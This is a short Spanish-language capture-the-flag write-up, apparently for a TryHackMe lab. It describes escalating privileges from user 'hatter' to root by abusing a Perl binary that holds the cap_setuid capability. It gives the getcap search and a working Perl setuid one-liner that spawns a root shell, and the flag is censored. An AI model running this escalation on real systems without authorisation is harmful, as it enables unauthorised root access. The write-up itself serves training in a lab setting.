# Fase 5 — Escalada: hatter → root (Linux capabilities)

[← Volver al README](../README.md) · [← Fase anterior](./04-privesc-rabbit-to-hatter.md)

Las *Linux capabilities* dividen los privilegios de root en permisos granulares que pueden asignarse a binarios concretos. Buscamos binarios con capacidades especiales:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl = cap_setuid+ep
```

`perl` tiene `cap_setuid` con flags *effective+permitted*: puede cambiar su UID a 0 sin ser root. El payload (ver [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities)):

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```
# whoami
root
```

Flag final (recordando que está "del revés", en el home de alice):

```bash
cat /home/alice/root.txt
thm{FLAG_CENSURADA}
```

**Root obtenido. ✅**

[← Volver al README](../README.md)
